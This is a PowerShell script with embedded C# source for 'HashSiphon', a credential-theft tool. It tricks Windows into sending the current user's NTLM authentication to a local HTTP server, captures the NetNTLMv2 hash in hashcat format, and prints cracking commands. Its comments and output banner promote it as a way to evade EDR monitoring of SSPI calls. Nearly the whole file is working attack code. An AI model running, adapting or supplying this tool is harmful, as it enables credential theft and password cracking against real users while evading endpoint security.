# ============================================================================
#  HashSiphon v1.0 — Novel NTLM Hash Extraction via HTTP Self-Authentication
# ============================================================================
#
#  TECHNIQUE:
#    1. Spawns a minimal TCP server on loopback with controlled NTLM Type 2 challenge
#    2. Makes an HTTP request using .NET HttpWebRequest with DefaultCredentials
#    3. The HTTP stack (WinHTTP) auto-authenticates via NTLM
#    4. Parses the NTLM Type 3 message from the Authorization header
#    5. Extracts NetNTLMv2 hash in hashcat format
#
#  WHY IT'S DIFFERENT FROM INTERNAL MONOLOGUE:
#    - No direct SSPI API calls (no AcquireCredentialsHandle, no InitializeSecurityContext)
#    - NTLM exchange is embedded in HTTP protocol, not raw SSPI buffers
#    - Our code only reads HTTP headers — WinHTTP handles NTLM internally
#    - Looks like HTTP traffic on loopback, not security API calls
#    - Different detection surface: network layer vs security API layer
# ============================================================================

$Code = @'
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class HashSiphon
{
    static byte[] challenge = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
    static string hashResult = null;
    static string errorMsg = null;

    // ============== NTLM Type 2 (Challenge) Message Builder ==============
    // We control the 8-byte challenge, so we can crack the resulting hash
    static byte[] BuildType2()
    {
        string target = Environment.MachineName;
        byte[] targetBytes = Encoding.Unicode.GetBytes(target);

        // Build AV_PAIR target info (required for NTLMv2)
        byte[] avDomain   = AvPair(0x0002, Encoding.Unicode.GetBytes(target));
        byte[] avComputer = AvPair(0x0001, Encoding.Unicode.GetBytes(target));
        byte[] avTimestamp = AvPair(0x0007, BitConverter.GetBytes(DateTime.UtcNow.ToFileTimeUtc()));
        byte[] avEol      = AvPair(0x0000, new byte[0]);

        int tiLen = avDomain.Length + avComputer.Length + avTimestamp.Length + avEol.Length;
        byte[] targetInfo = new byte[tiLen];
        int p = 0;
        Copy(avDomain, targetInfo, ref p);
        Copy(avComputer, targetInfo, ref p);
        Copy(avTimestamp, targetInfo, ref p);
        Copy(avEol, targetInfo, ref p);

        // Fixed header = 56 bytes (with Version), then payload
        int payloadOff = 56;
        int tnOff = payloadOff;
        int tiOff = tnOff + targetBytes.Length;
        int total = tiOff + targetInfo.Length;

        byte[] msg = new byte[total];

        // Signature "NTLMSSP\0"
        Array.Copy(Encoding.ASCII.GetBytes("NTLMSSP"), 0, msg, 0, 7);

        // Type = 2
        Le32(msg, 8, 2);

        // TargetName security buffer
        LeSB(msg, 12, (ushort)targetBytes.Length, tnOff);

        // NegotiateFlags
        // UNICODE | REQUEST_TARGET | NTLM | ALWAYS_SIGN | TARGET_INFO | 128 | KEY_EXCH | 56
        Le32(msg, 20, unchecked((int)0xE0828215u));

        // ServerChallenge (our controlled 8 bytes!)
        Array.Copy(challenge, 0, msg, 24, 8);

        // Reserved (offset 32, 8 bytes) — already zeros

        // TargetInfo security buffer
        LeSB(msg, 40, (ushort)targetInfo.Length, tiOff);

        // Version (offset 48): 10.0.19041
        msg[48] = 10; msg[49] = 0;
        msg[50] = 0x61; msg[51] = 0x4A;
        msg[55] = 0x0F;

        // Payload
        Array.Copy(targetBytes, 0, msg, tnOff, targetBytes.Length);
        Array.Copy(targetInfo, 0, msg, tiOff, targetInfo.Length);

        return msg;
    }

    static byte[] AvPair(ushort id, byte[] val)
    {
        byte[] r = new byte[4 + val.Length];
        r[0] = (byte)(id & 0xFF); r[1] = (byte)(id >> 8);
        r[2] = (byte)(val.Length & 0xFF); r[3] = (byte)(val.Length >> 8);
        if (val.Length > 0) Array.Copy(val, 0, r, 4, val.Length);
        return r;
    }

    static void Copy(byte[] src, byte[] dst, ref int pos)
    {
        Array.Copy(src, 0, dst, pos, src.Length);
        pos += src.Length;
    }

    static void Le32(byte[] b, int o, int v)
    {
        b[o] = (byte)v; b[o+1] = (byte)(v>>8); b[o+2] = (byte)(v>>16); b[o+3] = (byte)(v>>24);
    }

    static void LeSB(byte[] b, int o, ushort len, int off)
    {
        b[o] = (byte)(len & 0xFF); b[o+1] = (byte)(len >> 8);
        b[o+2] = b[o]; b[o+3] = b[o+1];
        Le32(b, o+4, off);
    }

    // ============== NTLM Type 3 (Authenticate) Parser ==============
    static string ParseType3(byte[] msg)
    {
        if (msg.Length < 64) return null;
        if (Encoding.ASCII.GetString(msg, 0, 7) != "NTLMSSP") return null;
        if (BitConverter.ToInt32(msg, 8) != 3) return null;

        // Security buffers: [len:2][maxlen:2][offset:4]
        ushort ntLen  = BitConverter.ToUInt16(msg, 20);
        int    ntOff  = BitConverter.ToInt32(msg, 24);
        ushort lmLen  = BitConverter.ToUInt16(msg, 12);
        int    lmOff  = BitConverter.ToInt32(msg, 16);
        ushort domLen = BitConverter.ToUInt16(msg, 28);
        int    domOff = BitConverter.ToInt32(msg, 32);
        ushort usrLen = BitConverter.ToUInt16(msg, 36);
        int    usrOff = BitConverter.ToInt32(msg, 40);

        if (ntOff + ntLen > msg.Length || usrOff + usrLen > msg.Length || domOff + domLen > msg.Length)
            return "  [-] Type 3 buffer overflow";

        string domain = domLen > 0 ? Encoding.Unicode.GetString(msg, domOff, domLen) : "?";
        string user   = usrLen > 0 ? Encoding.Unicode.GetString(msg, usrOff, usrLen) : "?";
        string chHex  = Hex(challenge, 0, 8);

        var sb = new StringBuilder();
        sb.AppendLine("  [+] User:        " + user);
        sb.AppendLine("  [+] Domain:      " + domain);
        sb.AppendLine("  [+] NT response: " + ntLen + " bytes" + (ntLen > 24 ? " (NTLMv2)" : ""));
        sb.AppendLine("  [+] LM response: " + lmLen + " bytes");

        if (ntLen > 24 && ntOff + ntLen <= msg.Length)
        {
            // NTLMv2: first 16 bytes = NTProofStr, rest = client blob
            byte[] ntResp = new byte[ntLen];
            Array.Copy(msg, ntOff, ntResp, 0, ntLen);

            string proof = Hex(ntResp, 0, 16);
            string blob  = Hex(ntResp, 16, ntLen - 16);

            sb.AppendLine();
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |              NetNTLMv2 HASH EXTRACTED!                   |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |  hashcat -m 5600 hash.txt wordlist.txt                   |");
            sb.AppendLine("  |  john --format=netntlmv2 hash.txt                        |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine();
            sb.AppendLine(user + "::" + domain + ":" + chHex + ":" + proof + ":" + blob);
        }
        else if (ntLen == 24)
        {
            byte[] ntResp = new byte[24];
            Array.Copy(msg, ntOff, ntResp, 0, 24);
            string lmHex = lmLen > 0 ? Hex(msg, lmOff, lmLen) : new string('0', 48);

            sb.AppendLine();
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |              NetNTLMv1 HASH EXTRACTED!                   |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |  hashcat -m 5500 hash.txt wordlist.txt                   |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine();
            sb.AppendLine(user + "::" + domain + ":" + lmHex + ":" + Hex(ntResp, 0, 24) + ":" + chHex);
        }
        else
        {
            sb.AppendLine("  [?] Unexpected NT response length: " + ntLen);
        }

        return sb.ToString();
    }

    static string Hex(byte[] data, int off, int len)
    {
        var sb = new StringBuilder(len * 2);
        for (int i = off; i < off + len; i++) sb.Append(data[i].ToString("x2"));
        return sb.ToString();
    }

    // ============== HTTP Server (loopback, single connection) ==============
    static void Server(int port, ManualResetEvent ready)
    {
        TcpListener listener = null;
        try
        {
            listener = new TcpListener(IPAddress.Loopback, port);
            listener.Start();
            ready.Set();

            using (TcpClient client = listener.AcceptTcpClient())
            {
                client.ReceiveTimeout = 15000;
                client.SendTimeout = 5000;
                NetworkStream ns = client.GetStream();

                // --- Request 1: Initial GET (no auth) ---
                string h1 = ReadHeaders(ns);
                if (h1 == null) { errorMsg = "No initial request received"; return; }

                string auth = FindAuth(h1);
                if (auth == null)
                {
                    // Send 401 to trigger NTLM negotiation
                    Send(ns, "HTTP/1.1 401 Unauthorized\r\n" +
                             "WWW-Authenticate: NTLM\r\n" +
                             "Content-Length: 0\r\n" +
                             "Connection: keep-alive\r\n\r\n");

                    // --- Request 2: Type 1 (Negotiate) ---
                    string h2 = ReadHeaders(ns);
                    if (h2 == null) { errorMsg = "No Type 1 request"; return; }
                    auth = FindAuth(h2);
                }

                if (auth == null) { errorMsg = "Client did not send NTLM Type 1"; return; }

                // --- Send Type 2 (Challenge) with OUR controlled challenge ---
                byte[] type2 = BuildType2();
                string type2B64 = Convert.ToBase64String(type2);

                Send(ns, "HTTP/1.1 401 Unauthorized\r\n" +
                         "WWW-Authenticate: NTLM " + type2B64 + "\r\n" +
                         "Content-Length: 0\r\n" +
                         "Connection: keep-alive\r\n\r\n");

                // --- Request 3: Type 3 (Authenticate) — contains the hash! ---
                string h3 = ReadHeaders(ns);
                if (h3 == null) { errorMsg = "No Type 3 request"; return; }
                string auth3 = FindAuth(h3);

                if (auth3 == null) { errorMsg = "Client did not send NTLM Type 3"; return; }

                // Parse Type 3 to extract NetNTLM hash
                byte[] type3 = Convert.FromBase64String(auth3);
                hashResult = ParseType3(type3);

                // Send 200 to complete the exchange
                Send(ns, "HTTP/1.1 200 OK\r\n" +
                         "Content-Length: 2\r\n" +
                         "Connection: close\r\n\r\nOK");
            }
        }
        catch (Exception ex)
        {
            if (errorMsg == null)
                errorMsg = "Server exception: " + ex.GetType().Name + ": " + ex.Message;
        }
        finally
        {
            if (listener != null) try { listener.Stop(); } catch { }
        }
    }

    static string ReadHeaders(NetworkStream ns)
    {
        // Read HTTP headers byte-by-byte until \r\n\r\n
        byte[] buf = new byte[32768];
        int total = 0;
        try
        {
            while (total < buf.Length - 1)
            {
                int r = ns.Read(buf, total, 1);
                if (r == 0) break;
                total += r;
                if (total >= 4 &&
                    buf[total-4] == (byte)'\r' && buf[total-3] == (byte)'\n' &&
                    buf[total-2] == (byte)'\r' && buf[total-1] == (byte)'\n')
                {
                    return Encoding.ASCII.GetString(buf, 0, total);
                }
            }
        }
        catch { }
        return total > 0 ? Encoding.ASCII.GetString(buf, 0, total) : null;
    }

    static string FindAuth(string headers)
    {
        // Find "Authorization: NTLM <base64>" header
        string search = "Authorization: NTLM ";
        int idx = headers.IndexOf(search, StringComparison.OrdinalIgnoreCase);
        if (idx < 0) return null;
        int start = idx + search.Length;
        int end = headers.IndexOf('\r', start);
        if (end < 0) end = headers.Length;
        string value = headers.Substring(start, end - start).Trim();
        return value.Length > 0 ? value : null;
    }

    static void Send(NetworkStream ns, string data)
    {
        byte[] bytes = Encoding.ASCII.GetBytes(data);
        ns.Write(bytes, 0, bytes.Length);
        ns.Flush();
    }

    // ============== Main Entry Point ==============
    public static string Run()
    {
        var o = new StringBuilder();
        o.AppendLine();
        o.AppendLine("  +----------------------------------------------------------+");
        o.AppendLine("  |  HashSiphon v1.0                                         |");
        o.AppendLine("  |  NTLM Hash via HTTP Self-Authentication                  |");
        o.AppendLine("  +----------------------------------------------------------+");
        o.AppendLine();
        o.AppendLine("  [i] API chain: TcpListener(loopback) + HttpWebRequest(DefaultCreds)");
        o.AppendLine("  [i] No SSPI imports - WinHTTP handles NTLM inside HTTP layer");
        o.AppendLine("  [i] We control the Type 2 challenge, extract hash from Type 3");
        o.AppendLine();

        // Allocate a random port
        TcpListener tmp = new TcpListener(IPAddress.Loopback, 0);
        tmp.Start();
        int port = ((IPEndPoint)tmp.LocalEndpoint).Port;
        tmp.Stop();

        o.AppendLine("  [1] Allocated port: " + port + " on 127.0.0.1");
        o.AppendLine("  [2] Controlled challenge: " + Hex(challenge, 0, 8));

        hashResult = null;
        errorMsg = null;

        // Start HTTP server
        var ready = new ManualResetEvent(false);
        var serverThread = new Thread(() => Server(port, ready));
        serverThread.IsBackground = true;
        serverThread.Start();

        if (!ready.WaitOne(5000))
        {
            o.AppendLine("  [-] Server thread failed to start");
            return o.ToString();
        }
        Thread.Sleep(50); // Brief settle

        o.AppendLine("  [3] HTTP NTLM server ready");
        o.AppendLine("  [4] Sending request with DefaultNetworkCredentials (NTLM)...");

        // HTTP client — uses default Windows credentials
        try
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(
                "http://127.0.0.1:" + port + "/siphon");

            // Force NTLM (not Negotiate/Kerberos) with default credentials
            CredentialCache cc = new CredentialCache();
            cc.Add(new Uri("http://127.0.0.1:" + port),
                   "NTLM", CredentialCache.DefaultNetworkCredentials);
            req.Credentials = cc;
            req.UnsafeAuthenticatedConnectionSharing = true;
            req.PreAuthenticate = false;
            req.Timeout = 15000;
            req.KeepAlive = true;
            req.Method = "GET";
            req.UserAgent = "HashSiphon/1.0";

            using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
            {
                o.AppendLine("  [5] HTTP exchange completed: " + (int)resp.StatusCode + " " + resp.StatusDescription);
            }
        }
        catch (WebException ex)
        {
            if (hashResult != null)
                o.AppendLine("  [5] NTLM exchange completed (client saw auth error - expected)");
            else
                o.AppendLine("  [-] HTTP client error: " + ex.Message);
        }

        serverThread.Join(5000);

        // Output results
        if (hashResult != null)
        {
            o.AppendLine();
            o.Append(hashResult);
        }
        else
        {
            o.AppendLine();
            o.AppendLine("  [-] Hash extraction failed");
            if (errorMsg != null) o.AppendLine("  [-] Reason: " + errorMsg);
        }

        // Technique comparison
        o.AppendLine();
        o.AppendLine("  +----------------------------------------------------------+");
        o.AppendLine("  |        HashSiphon vs Internal Monologue                  |");
        o.AppendLine("  +----------------------------------------------------------+");
        o.AppendLine("  |                                                          |");
        o.AppendLine("  |  Internal Monologue (2018, SSPI layer):                  |");
        o.AppendLine("  |    AcquireCredentialsHandle(NTLM)                        |");
        o.AppendLine("  |    InitializeSecurityContext (client Type 1)              |");
        o.AppendLine("  |    Craft Type 2 with known challenge                     |");
        o.AppendLine("  |    InitializeSecurityContext (client Type 3)              |");
        o.AppendLine("  |    Parse Type 3 => NetNTLM hash                          |");
        o.AppendLine("  |    * 4+ direct SSPI API calls                            |");
        o.AppendLine("  |    * Creates security context objects                    |");
        o.AppendLine("  |    * EDRs hook SSPI functions directly                   |");
        o.AppendLine("  |                                                          |");
        o.AppendLine("  |  HashSiphon (HTTP Self-Auth layer):                      |");
        o.AppendLine("  |    TCP socket server on 127.0.0.1 (random port)          |");
        o.AppendLine("  |    Send HTTP 401 + WWW-Authenticate: NTLM               |");
        o.AppendLine("  |    Send Type 2 with controlled challenge via HTTP header  |");
        o.AppendLine("  |    HttpWebRequest auto-sends Type 3 via WinHTTP          |");
        o.AppendLine("  |    Parse Type 3 from HTTP Authorization header           |");
        o.AppendLine("  |    * Zero direct SSPI API calls from our code            |");
        o.AppendLine("  |    * WinHTTP handles NTLM internally (indirect)          |");
        o.AppendLine("  |    * Looks like HTTP traffic, not security API calls     |");
        o.AppendLine("  |    * Different detection vectors entirely                |");
        o.AppendLine("  |                                                          |");
        o.AppendLine("  +----------------------------------------------------------+");

        return o.ToString();
    }
}
'@

Write-Host "`n  [*] Compiling HashSiphon..." -ForegroundColor Cyan
try {
    Add-Type -TypeDefinition $Code -ErrorAction Stop
    Write-Host "  [+] Compiled" -ForegroundColor Green
} catch {
    if ($_.Exception.Message -like "*already exists*") {
        Write-Host "  [*] Type already loaded" -ForegroundColor Yellow
    } else {
        Write-Host "  [-] Compilation error: $_" -ForegroundColor Red
        exit 1
    }
}

Write-Host "  [*] Running HashSiphon..." -ForegroundColor Cyan
$result = [HashSiphon]::Run()
Write-Host $result
